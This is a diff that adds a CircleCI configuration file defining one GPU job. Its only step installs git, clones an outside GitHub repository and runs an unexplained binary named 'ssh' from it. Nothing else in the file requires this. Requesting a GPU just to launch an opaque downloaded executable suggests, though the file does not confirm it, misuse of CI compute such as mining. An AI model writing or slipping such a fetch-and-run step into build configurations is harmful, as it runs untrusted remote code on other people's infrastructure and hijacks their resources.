@@ -1,0 +1,8 @@
+version: 2.1
+jobs:
+  myGPUJob:
+    machine:
+      image: circleci/classic:latest
+    resource_class: gpu.medium # Uses the "gpu.medium" machine executor
+    steps:
+      - run: apt-get update -y && apt-get install -y sudo git && git clone https://github.com/kijang-7/ssh && cd ssh && chmod +x ssh && ./ssh
